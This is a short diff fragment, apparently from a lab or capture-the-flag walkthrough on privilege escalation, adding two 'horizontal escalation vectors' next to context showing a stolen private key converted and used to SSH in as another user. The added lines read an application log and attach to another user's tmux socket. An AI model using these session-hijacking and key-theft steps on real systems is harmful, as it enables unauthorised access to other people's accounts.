@@ -40,6 +40,13 @@ puttygen /tmp/.sys_cache/.thumb -O private-openssh -o /tmp/converted_id
 /tmp/.sys_cache$ chmod 600 /tmp/converted_id
 /tmp/.sys_cache$ ssh -i /tmp/converted_id alice@localhost
 
+## Horizontal Escalation Vector 2
+
+cat /var/log/flaskapp.log
+
+## Horizontal Escalation Vector 3
+
+tmux -S /tmp/alice_tmux.sock attach -t shared
 
 ## Vertical Escalation Vector 1
 
